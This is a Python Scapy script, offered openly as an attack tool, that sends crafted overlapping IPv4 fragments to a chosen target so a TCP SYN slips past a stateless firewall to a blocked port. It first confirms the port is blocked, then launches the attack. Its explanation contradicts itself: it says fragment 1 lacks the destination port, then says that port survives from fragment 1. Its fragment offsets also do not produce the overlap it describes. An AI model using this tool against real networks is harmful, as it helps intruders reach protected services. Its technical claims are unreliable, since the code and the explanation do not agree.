#!/usr/bin/env python3
"""
overlapping_fragmentation_attack.py

Demonstrates how overlapping IP fragments can bypass stateless packet filtering.

Attack mechanism:
  Fragment 1  — carries IP header + first 2 bytes of TCP header (source port only).
                No destination port present. Passes the firewall rule unchallenged.

  Fragment 2  — overlaps Fragment 1 at offset 1. Carries the remaining TCP header
                with the destination port rewritten to port 80 (appears benign).
                Forwarded as a fragment continuation — no port check applied.

  Fragment 3  — carries the payload. Completes the fragment set.

On arrival at the victim, the Linux kernel reassembles all three fragments.
Because Linux favors earlier data on overlap conflicts (RFC 791), the original
destination port (7777) from Fragment 1 is preserved in the final reassembled
packet. The TCP SYN lands on port 7777. The victim responds. Connection established.

Usage:
  python3 overlapping_fragmentation_attack.py <target_ip> [target_port]

Requirements:
  pip install scapy
  Must be run with root / NET_RAW capability for raw socket access.
"""

from scapy.all import IP, TCP, Raw, send, RandShort
import sys
import time
import socket
import struct
import random


def verify_firewall(target_ip: str, target_port: int = 7777) -> bool:
    """
    Attempt a direct TCP connection to confirm the firewall is active.
    Returns True if the port is blocked, False if already accessible.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        result = s.connect_ex((target_ip, target_port))
        s.close()
        if result == 0:
            print(f"[!] Warning: {target_ip}:{target_port} is already accessible — firewall may not be active.")
            return False
        else:
            print(f"[+] Confirmed: {target_ip}:{target_port} is blocked by firewall. Proceeding with attack.")
            return True
    except Exception as e:
        print(f"[-] Error during firewall check: {e}")
        return False


def fragment_overlap_attack(target_ip: str, target_port: int = 7777) -> None:
    """
    Craft and send three overlapping IP fragments designed to bypass
    stateless firewall rules blocking TCP access to target_port.
    """
    print(f"\n[*] Starting overlapping fragment attack -> {target_ip}:{target_port}")

    # All three fragments must share the same IP ID so the victim's kernel
    # treats them as parts of a single original packet and reassembles them together
    ip_id = random.randint(1000, 65000)
    print(f"[*] Using IP ID: {ip_id}")

    # Build the baseline TCP SYN packet targeting the blocked port
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    payload = b"PROBE"
    ip_header_len = 20  # Standard IPv4 header is always 20 bytes

    # -------------------------------------------------------------------------
    # Fragment 1: IP header + first 2 bytes of TCP header (source port only)
    # Offset 0, MF flag set (more fragments follow)
    # The firewall sees no destination port in this fragment — rule does not fire
    # -------------------------------------------------------------------------
    full_packet_bytes = bytes(IP(dst=target_ip, id=ip_id) / tcp)
    frag1 = IP(dst=target_ip, id=ip_id, flags="MF") / Raw(
        load=full_packet_bytes[ip_header_len: ip_header_len + 2]
    )

    # -------------------------------------------------------------------------
    # Fragment 2: Overlapping at offset 1 — carries remaining TCP header
    # Destination port bytes are rewritten to 80 to appear benign in transit
    # Firewall forwards this as a continuation fragment without port inspection
    # -------------------------------------------------------------------------
    rest_of_tcp = bytearray(bytes(tcp)[2:])       # TCP bytes after source port
    rest_of_tcp[0:2] = struct.pack("!H", 80)      # Overwrite dst port field with 80 (HTTP)
    frag2 = IP(dst=target_ip, id=ip_id, frag=1, flags="MF") / Raw(
        load=bytes(rest_of_tcp)
    )

    # -------------------------------------------------------------------------
    # Fragment 3: Payload — completes the fragment set
    # No MF flag — signals this is the final fragment
    # -------------------------------------------------------------------------
    frag3 = IP(dst=target_ip, id=ip_id, frag=3) / Raw(load=payload)

    # Send fragments sequentially with small delays to ensure correct ordering
    # Fragment 1 must arrive before Fragment 2 to exploit Linux's first-write-wins
    # overlap resolution behavior
    print("[*] Sending Fragment 1 — partial TCP header (no destination port)")
    send(frag1, verbose=0)
    time.sleep(0.2)

    print("[*] Sending Fragment 2 — overlapping TCP header (dst port rewritten to 80)")
    send(frag2, verbose=0)
    time.sleep(0.2)

    print("[*] Sending Fragment 3 — payload")
    send(frag3, verbose=0)

    print("[+] All fragments sent.")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> [target_port]")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 7777

    # Step 1: Confirm firewall is active before launching
    verify_firewall(target_ip, target_port)

    # Step 2: Execute the overlapping fragment attack
    fragment_overlap_attack(target_ip, target_port)
